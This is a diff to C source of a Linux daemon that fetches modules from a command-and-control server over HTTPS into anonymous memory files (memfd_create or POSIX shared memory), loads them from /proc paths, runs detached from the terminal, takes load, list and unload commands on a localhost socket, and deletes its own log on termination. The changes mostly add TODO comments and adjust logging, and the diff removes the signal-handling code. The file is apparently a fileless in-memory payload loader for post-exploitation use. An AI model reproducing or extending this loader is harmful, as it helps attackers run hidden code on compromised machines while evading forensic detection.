@@ -43,6 +43,7 @@
 
 
 // Wrapper to call memfd_create syscall
+// TODO: refactor
 inline int memfd_create(const char *name, unsigned int flags) {
 	return syscall(__NR_memfd_create, name, flags);
 }
@@ -52,6 +53,7 @@ inline int memfd_create(const char *name, unsigned int flags) {
 //
 // return 0 - POSIX shm only , 1 - memfd_create supported
 // 
+// TODO: refactor
 int checKernel() {
 
 	struct utsname buffer;
@@ -111,6 +113,8 @@ int checKernel() {
 	}
 }
 
+// TODO: implement true rand
+// TODO: paramterize size of string
 void gen_random(char *s, const int len) {
     static const char alphanum[] =
         "0123456789"
@@ -126,12 +130,13 @@ void gen_random(char *s, const int len) {
 
 
 // Returns a file descriptor where we can write our shared object
+// TODO: refactor
 int open_ramfs(Shared_Mem_Fd * smf) {
 
     int shm_fd = 0;
-    char s[6] = {};
+    char s[6] = {}; //TODO: parameterize
 
-    gen_random(s, 6);
+    gen_random(s, 6);//TODO: parameterize 
 
 	if (memfd_kv_s.memfd_supp == 0) {
 		shm_fd = shm_open(s, O_RDWR | O_CREAT, S_IRUSR|S_IRUSR|S_IRGRP|S_IRGRP|S_IRGRP|S_IRGRP);
@@ -151,11 +156,12 @@ int open_ramfs(Shared_Mem_Fd * smf) {
 	}
 
     smf->shm_fd=shm_fd;
-    memcpy(smf->shm_mname, s, 6);
+    memcpy(smf->shm_mname, s, 6);//TODO: parameterize
 	return shm_fd;
 }
 
 // Download payload from a C&C via HTTPs
+// TODO: refactor
 int download_to_RAM(char *downloadUrl, char *fileName) { 
 
 	CURL *curl;
@@ -176,6 +182,7 @@ int download_to_RAM(char *downloadUrl, char *fileName) {
         memcpy(shm_fd_s.shm_fname, fileName, SHM_NAME_MAX -1 );
     }
 
+    // TODO: decide between shm_fd and status as return since we set up shm_fd via the struct passed in
 	shm_fd = open_ramfs(&shm_fd_s); // Give me a file descriptor to memory
 
     if ( shm_fd == 0 || shm_fd_s.shm_fd == 0){ // memory not allocated - return
@@ -186,6 +193,8 @@ int download_to_RAM(char *downloadUrl, char *fileName) {
 	log_info("RamWorker: File Descriptor %d Shared Memory created", shm_fd_s.shm_fd);
 	log_debug("RamWorker: Passing URL to cURL: %s", downloadUrl);
 
+    // TODO: parameterize to HTTP/HTTPS/etc.
+    // TODO: test HTTPS, check cert validation
     curl_global_init(CURL_GLOBAL_DEFAULT);    
 	curl = curl_easy_init();
 	if (curl) {
@@ -195,6 +204,8 @@ int download_to_RAM(char *downloadUrl, char *fileName) {
 		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
        
         // WARNING: fdopen(3) The result of applying fdopen() to a shared memory object is undefined. 
+        // So far works but TODO: test across platforms. Most likely file semantics are preserved
+        // but the behavior is undefined due to fcntl things like SEALS
         shm_file=fdopen(shm_fd_s.shm_fd, "w"); 
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, shm_file); 
 		
@@ -213,7 +224,7 @@ int download_to_RAM(char *downloadUrl, char *fileName) {
 
 void cleanup_mod_resources(int shm_fd){
 
-    char procpath[1024];
+    char procpath[1024]; // TODO: what should this be? parameterize
     char *shmpath;
     struct stat sb;
     
@@ -242,7 +253,7 @@ void cleanup_mod_resources(int shm_fd){
 }
 
 int setMemfdTbl(int shm_fd, char* mname) {
-    char path[1024];
+    char path[1024]; // TODO: what should this be?
     char mstate[] = "L"; //Loaded
     
     // TODO: Allow commands to seal the modules that would never be modified
@@ -303,7 +314,7 @@ int main (int argc, char **argv) {
 
 void doWork(){
 
-    char urlbuf[255] = {'\0'};
+    char urlbuf[255] = {'\0'}; // TODO: what should this be?
     int  i;
 
     if (checKernel() == 1){
@@ -346,29 +357,29 @@ int backgroundDaemonLeader(){
 
     // Fork again, allowing the parent process to terminate.
     //signal(SIGHUP,SIG_IGN);
-    log_debug("Daemon: before signal SIGCHLD");
+    log_trace("Daemon: setting up SIGCHLD");
     signal(SIGCHLD, SIG_IGN); // avoid defunct processes. 
-    log_debug("Daemon: before second fork()");
+    log_trace("Daemon: before second fork()");
     pid=fork();
-    log_debug("Daemon: after second fork()");
+    log_trace("Daemon: after second fork()");
     if (pid == -1) {
         log_error("Daemon: failed to fork while daemonising (errno=%d)",errno);
     } else if (pid != 0) {
-        log_debug("Daemon: after first fork() in parent. exiting.");
+        log_trace("Daemon: after first fork() in parent. exiting.");
         _exit(0);
     }
 
     // Set the current working directory to the root directory.
-    log_debug("Daemon: before chdir()");
+    log_trace("Daemon: before chdir()");
     if (chdir(DAEMON_CHDIR) == -1) {
         log_error("Daemon: failed to change working directory while daemonising (errno=%d)",errno);
     }
 
     // Set the user file creation mask to zero.
-    log_debug("Daemon: before umask()");
+    log_trace("Daemon: before umask()");
     umask(0);
 
-    log_debug("Daemon: before close() FD 0,1,2");
+    log_trace("Daemon: before close() FD 0,1,2");
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
@@ -383,19 +394,21 @@ int backgroundDaemonLeader(){
     if (open("/dev/null",O_RDWR) == -1) {
 	  log_error("Daemon: failed to reopen stderr while daemonising (errno=%d)",errno);
     }
-    log_debug("Daemon: after reopen FD 0,1,2 ro /dev/null");
+    log_trace("Daemon: after reopen FD 0,1,2 set to /dev/null");
 
-    log_debug("Daemon: before signal handlers");
+    log_debug("Daemon: Setting signal handlers");
+    log_trace("Daemon: before signal handlers");
+
     setSignalHandlers();
-    log_debug("Daemon: after signal handlers");
-
-    log_debug("Daemon: before doWork()");
+    log_trace("Daemon: after signal handlers");
+    log_trace("Daemon: before doWork()");
 
     return 0;
 }
 
 int setupCmdP(){
 
+    // TODO: Allow Unix domain sockets
     unsigned int portno, clilen, sockfd, newsockfd;
     struct sockaddr_in serv_addr, cli_addr; // AF_INET
     // struct sockaddr_un serv_addr_un; // AF_UNIX
@@ -412,19 +425,20 @@ int setupCmdP(){
 
 
     bzero((char *) &serv_addr, sizeof(serv_addr));
-    portno = 0; // random port
+    portno = 0; // random port // TODO: parameterize
 
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_addr.s_addr = htonl(0x7f000001L); // 127.0.0.1
+    serv_addr.sin_addr.s_addr = htonl(0x7f000001L); // 127.0.0.1 // TODO: parameterize
     serv_addr.sin_port = htons(portno);
 
     if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
       log_error("Error on bind()");
-      return -1;
+      return -1; // TODO: make a pass to check all return codes to make them consistent
     }
     setsockopt(sockfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
-    listen(sockfd,5);
-    log_info("Listening on port");
+    listen(sockfd,5); // TODO: paramterize
+
+    log_info("Listening on port"); // TODO: provide the port
     clilen = sizeof(cli_addr);
 
     /* AF_UNIX 
@@ -433,8 +447,8 @@ int setupCmdP(){
     listen(sockfd,5);
     */
 
-
     while (1) {
+        
       log_info("Accepting requests");
       newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
 
@@ -443,28 +457,28 @@ int setupCmdP(){
          continue;
       }
 
-      // We are not dorking as we wat to to preserve the PID for FD's
+      // We are not forking as we want to to preserve the PID for /proc/ FD's
       processCommandReq(newsockfd, head);
       close(newsockfd);
-
     }
 
     return 0;
 }
 
 
+// TODO: is there a better way to handle commands as the grow. Also, refactor
 int processCommandReq (int sock, node_t * head) {
-   int n;
+   int  n = 0;
    char buffer[MAX_BUF];
-   int status = 0;
+   int  status = 0;
 
-   cJSON * root = NULL;
-   cJSON * cmdName = NULL;
+   cJSON * root         = NULL;
+   cJSON * cmdName      = NULL;
 
-   cJSON * loadmod_arg = NULL;
+   cJSON * loadmod_arg  = NULL;
    cJSON * loadmod_args = NULL;
-   cJSON * modUrl = NULL;
-   cJSON * modName = NULL;
+   cJSON * modUrl       = NULL;
+   cJSON * modName      = NULL;
 
 
    bzero(buffer,MAX_BUF);
@@ -478,6 +492,7 @@ int processCommandReq (int sock, node_t * head) {
    log_info("Request payload: >> %s <<",buffer);
 
    // Rudimentary checks for JSON. this library is SIGSEGV if invalid. We take that chance for now.
+   // TODO: test if needed since wwe have implemented cJSON_Parse()
    if ( strchr(buffer, '}') == NULL \
                 || strchr(buffer, '{') == NULL  \
                 || strchr(buffer, '"') == NULL ){
@@ -499,7 +514,7 @@ int processCommandReq (int sock, node_t * head) {
 
    if (cJSON_IsString(cmdName) && (cmdName->valuestring != NULL))
    {
-     if (strcmp(cmdName->valuestring, "listmod") == 0)
+     if (strcmp(cmdName->valuestring, "listmod") == 0) // TODO: allow short condensed string
      {
        log_debug("[Command] : %s", cmdName->valuestring);
        write_modlist(head, sock);
@@ -560,6 +575,7 @@ end:
 
 }
 // ------------------- Node table ----------------
+// TODO: try to implement node deletion 
 int check_empty(node_t * head){
     int empty  = (head == NULL) ? 0 : 1;
     return empty;
@@ -656,9 +672,9 @@ void write_modlist(node_t * head, int sock) {
 }
 
 int unload_mod(node_t * head, char * name) {
-    int modfd = 0;
-    int status = 0;
-    int loaded = 1;
+    int modfd   = 0;
+    int status  = 0;
+    int loaded  = 1; // TODO: why is it here? 
 
     modfd = mod_name2fd(head, name, loaded);
     if ( modfd != 0 ){
@@ -677,8 +693,8 @@ int unload_mod(node_t * head, char * name) {
 
 int find_mod(node_t * head, char * name) {
     
-    char* modname = NULL;
-    int status = 0;
+    char* modname   = NULL;
+    int   status    = 0;
 
     modname = mod_name2path(head, name);
     if ((modname != NULL) && (modname[0] != '\0')) {
@@ -691,13 +707,14 @@ int find_mod(node_t * head, char * name) {
     return status;
 }
 
+// TODO: is load the same as activate? Should we have it as separate action?
 int load_mod(node_t * head, char * url) {
 
-    int fd;
+    int fd; // TODO: do we or don;t we need to set ints to 0
 
-    CURLU *h;
-    CURLUcode uc;
-    char *path, *cpath=NULL;
+    CURLU       *h;
+    CURLUcode   uc;
+    char        *path, *cpath=NULL;
 
     h = curl_url();
     if(!h){
@@ -734,19 +751,19 @@ clean:
     curl_url_cleanup(h); /* free url handle */
 
     return 0;
-
 }
 
 //delete a link with given key
+// TODO: implement size and type in status
 int mark_delete_mod(node_t * head, int fd) {
 
    node_t * current = head;
-   int status = 0;
-   char state[] = "U";
+   int status       = 0;
+   char state[]     = "U";
 
-   if(head == NULL) {
+   if(head == NULL)
       return status;
-   }
+
    while (current != NULL) {
       if ( current->fd == fd ){ // found
           strncpy(current->mstate, state, strlen(state));
@@ -793,93 +810,5 @@ int push(node_t * head, int shm_fd, char* path, char* mname, char mstate[]) {
     log_debug("ModTable: entry: %s : %s", current->mname, current->mpath);
 
     return 0;
-}
-
-/* -------------- SIG Handlers ------------------- */
-
-void setSignalHandlers(){
-    signal(SIGHUP,  handleSig);
-    signal(SIGUSR1, handleSig);
-    signal(SIGUSR2, handleSig);
-    signal(SIGINT,  handleSig);
-    signal(SIGTERM, handleSig);
-}
-
-void handleSig(int signo) {
-    /*
-     * Signal safety: It is not safe to call clock(), printf(),
-     * or exit() inside a signal handler. Instead, we set a flag.
-     */
-    switch(signo){
-        case SIGHUP:
-            log_warn("Signal handler got SIGHUP signal ... ");
-            sigflag = 1;
-            doSigHup();
-            break;
-        case SIGUSR1:
-            log_warn("Signal handler got SIGUSR1 signal ... ");
-            sigflag = 2;
-            doSigUsr1();
-            break;
-        case SIGUSR2:
-            log_warn("Signal handler got SIGUSR1 signal ... ");
-            sigflag = 3;
-            doSigUsr1();
-            break;
-        case SIGINT:
-            log_warn("Signal handler got SIGINT signal ... ");
-            sigflag = 4;
-            doSigInt();
-            break;
-        case SIGTERM:
-            log_warn("Signal handler got SIGTERM signal ... ");
-            sigflag = 5;
-            doSigTerm();
-            break;
-    }
-}
-
-void doSigHup(void){
-    sigflag = 0; // check or reset
-    log_debug("Executing SIGHUP code here ...");
-}
-
-void doSigUsr1(void){
-    sigflag = 0; // check or reset
-    log_debug("== Stats: \tPID: %d, Log: %s ==", getpid(), logFile);
-    log_debug("Executing SIGUSR1 code here ...");
-}
-void doSigUsr2(void){
-    sigflag = 0; // check or reset
-    log_debug("Executing SIGUSR2 code here ...");
-    log_set_level(1); // increase logging to DEBUG
-}
-void doSigInt(void){
-    sigflag = 0; // check or reset
-    log_debug("Executing SIGINT code here ...");
-    log_debug("=== ZAF down ===");
-    cleanup(0); // leave log intact
-    exit(0);
-}
-void doSigTerm(void){
-    sigflag = 0; // check or reset
-    log_debug("Executing SIGTERM code here ...");
-    log_debug("=== ZAF down ===");
-    // - logrotate log
-    // - Send log offsite
-    cleanup(1); // remove log
-    exit(0);
-}
-
-void cleanup(int cleanLog){
-    struct stat sb;
-
-    fclose(fp);
-
-    if (cleanLog) {
-        if (lstat(logFile, &sb) != -1){
-            unlink(logFile);
-        }
-    }
 }
 
